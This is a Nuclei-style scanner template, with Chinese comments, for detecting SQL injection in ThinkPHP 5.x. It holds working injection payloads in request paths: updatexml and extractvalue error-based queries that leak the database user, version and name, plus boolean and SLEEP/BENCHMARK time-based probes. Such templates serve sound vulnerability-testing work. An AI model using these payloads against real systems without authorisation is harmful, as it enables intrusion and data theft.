id: thinkphp-sqli
info:
  name: ThinkPHP SQL Injection (updatexml)
  severity: Critical
  description: |
    检测 ThinkPHP 5.x 版本中存在的 SQL 注入漏洞，利用 updatexml 函数进行报错注入。
    该漏洞通常存在于数组参数的 SQL 查询中。
  tags:
    - sqli
    - thinkphp
    - updatexml
  reference:
    - https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

requests:
  # 测试1: updatexml 报错注入（仅匹配 MySQL 报错正文，禁止用 "updatexml" 等词：
  # Django/Flask DEBUG 页会把请求 URL 回显到响应体，导致 payload 中的函数名被误当成数据库报错）
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,database()),0)]=1"
    matchers:
      - type: word
        words:
          - "XPATH syntax error"
        condition: and
        part: body

  # 测试2: extractvalue / updatexml 报错（同样只认 MySQL XPATH 报错字符串）
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
      - "{{BaseURL}}/index.php?ids[0,extractvalue(1,concat(0xa,user()))]=1"
    matchers-condition: and
    matchers:
      - type: status
        status: [500]
      - type: word
        words:
          - "XPATH syntax error"
        condition: and
        part: body

  # 测试3: version() 报错注入（版本号 + 真实 SQL 报错特征；不用 "updatexml" 以免 URL 回显误报）
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[0,updatexml(0,concat(0xa,version()),0)]=1"
    matchers-condition: and
    matchers:
      - type: status
        status: [500]
      - type: regex
        regex:
          - "\\d+\\.\\d+\\.\\d+"
        part: body
      - type: word
        words:
          - "XPATH syntax error"
          - "MySQL server version"
        condition: or
        part: body

  # 测试4: 检查典型 MySQL/PHP 驱动报错（移除泛化的 "syntax error"，Django 调试页常含该短语）
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[' OR '1'='1']=1"
      - "{{BaseURL}}/index.php?ids[1 AND 1=1]=1"
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "mysql_error"
          - "mysqli_"
          - "Query failed"
        condition: or
        part: body

  # 测试5: 时间盲注检测（通过响应时间差异）
  - method: GET
    preconditions:
      methods: [GET]
    path:
      - "{{BaseURL}}/index.php?ids[SLEEP(3)]=1"
      - "{{BaseURL}}/index.php?ids[BENCHMARK(5000000,SHA1('test'))]=1"
    matchers:
      - type: status
        status: [200]
